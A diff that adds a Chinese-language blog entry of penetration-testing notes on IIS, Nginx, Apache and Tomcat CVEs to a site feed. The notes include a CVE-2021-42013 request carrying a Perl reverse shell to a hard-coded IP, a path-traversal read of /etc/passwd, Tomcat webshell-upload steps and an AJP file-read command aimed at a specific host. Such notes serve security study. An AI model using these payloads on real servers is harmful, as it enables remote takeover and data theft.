@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</title>
+      <link href="/2022/04/16/zhong-jian-jian-an-quan-cve-fu-xian-iis-apache-tomcat-nginx/"/>
+      <url>/2022/04/16/zhong-jian-jian-an-quan-cve-fu-xian-iis-apache-tomcat-nginx/</url>
+      
+        <content type="html"><![CDATA[<blockquote></blockquote><h3 id="中间件安全-amp-CVE复现-amp-IIS-amp-Apache-amp-Tomcat-amp-Nginx"><a href="#中间件安全-amp-CVE复现-amp-IIS-amp-Apache-amp-Tomcat-amp-Nginx" class="headerlink" title="中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx"></a>中间件安全&amp;CVE复现&amp;IIS&amp;Apache&amp;Tomcat&amp;Nginx</h3><hr><p>中间件及框架列表：</p><pre><code>IIS，Apache，Nginx，Tomcat，Docker，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</code></pre><h4 id="一-中间件-IIS-短文件-amp-解析-amp-蓝屏等"><a href="#一-中间件-IIS-短文件-amp-解析-amp-蓝屏等" class="headerlink" title="一.中间件-IIS-短文件&amp;解析&amp;蓝屏等:"></a>一.中间件-IIS-短文件&amp;解析&amp;蓝屏等:</h4><p>1、短文件：信息收集</p><p>2、文件解析：还有点用</p><p>3、HTTP.SYS：蓝屏崩溃</p><p>4、CVE-2017-7269 条件过老</p><h4 id="二-中间件-Nginx-文件解析-amp-命令执行等"><a href="#二-中间件-Nginx-文件解析-amp-命令执行等" class="headerlink" title="二.中间件-Nginx-文件解析&amp;命令执行等:"></a>二.中间件-Nginx-文件解析&amp;命令执行等:</h4><p>1、后缀解析 文件名解析</p><p>配置不当：该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p><p>CVE-2013-4547：影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><p>2、cve_2021_23017 无EXP</p><p>3、cve_2017_7529 意义不大</p><h4 id="三-中间件-Apache-RCE-amp-目录遍历-amp-文件解析等"><a href="#三-中间件-Apache-RCE-amp-目录遍历-amp-文件解析等" class="headerlink" title="三.中间件-Apache-RCE&amp;目录遍历&amp;文件解析等:"></a>三.中间件-Apache-RCE&amp;目录遍历&amp;文件解析等:</h4><p>Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点，发现 Apache HTTP Server 2.4.50 中针对 CVE-2021-41773 的修复不够充分。攻击者可以使用路径遍历攻击将 URL 映射到由类似别名的指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“要求全部拒绝”的保护，则这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则这可能允许远程代码执行。此问题仅影响 Apache 2.4.49 和 Apache 2.4.50，而不影响更早版本。</p><p>1.cve_2021_42013  RCE:</p><pre><code>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh echo;perl -e 'use Socket;$i="47.94.236.117";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</code></pre><p>2、cve_2021_41773 目录穿越</p><p>Apache HTTP Server 2.4.49、2.4.50版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。</p><pre><code>Burp：/icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd</code></pre><p>3、cve-2017-15715  文件解析</p><p>Apache HTTPD是一款HTTP服务器。其2.4.0~2.4.29版本存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>4、cve_2017_9798 价值不高</p><p>5、cve_2018_11759 价值不高</p><p>6、cve_2021_37580 插件问题</p><h4 id="四-中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等"><a href="#四-中间件-Tomcat-弱口令-amp-文件上传-amp-文件包含等" class="headerlink" title="四.中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等:"></a>四.中间件-Tomcat-弱口令&amp;文件上传&amp;文件包含等:</h4><p>1、弱口令猜解</p><p>配置不当导致后台弱口令，可通过上传jsp压缩包改名的war拿shell</p><p>生成马：xx.jsp 然后压缩成xx.zip 然后改后缀名为xx.war 进行上传</p><p>2、CVE-2017-12615 文件上传</p><p>当存在漏洞的Tomcat运行在Windows/Linux主机上， 且启用了HTTP PUT请求方法（ 例如， 将readonly初始化参数由默认值设置为false） ， 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的JSP的webshell文件，JSP文件中的恶意代码将能被服务器执行， 导致服务器上的数据泄露或获取服务器权限。</p><p>影响版本:Apache Tomcat 7.0.0 - 7.0.79</p><p>PUT /1.jsp/ HTTP/1.1</p><p>shell代码</p><p>3、cve_2020_1938 文件包含</p><p>Apache Tomcat AJP协议（默认8009端口）由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp目录下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步结合文件包含实现远程代码的执行。</p><p>漏洞影响的产品版本包括：</p><p>Tomcat 6.*</p><p>Tomcat 7.* &lt; 7.0.100</p><p>Tomcat 8.* &lt; 8.5.51</p><p>Tomcat 9.* &lt; 9.0.31</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><pre><code>D:\Python27\python.exe CNVD-2020-10487-Tomcat-Ajp-lfi.py 123.58.236.76 -p 63667 -f WEB-INF/web.xml</code></pre><p>4、cve_2020_11996 拒绝服务</p><p>危害过大，权限无关，意义不大</p><p>5、cve_2020_9484 反序列化</p><p>利用条件太苛刻，意义不大</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Shmily </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</title>
       <link href="/2022/04/13/php-fan-xu-lie-hua-pop-lian-gou-zao-mo-zhu-fang-fa-yuan-sheng-lei/"/>
       <url>/2022/04/13/php-fan-xu-lie-hua-pop-lian-gou-zao-mo-zhu-fang-fa-yuan-sheng-lei/</url>
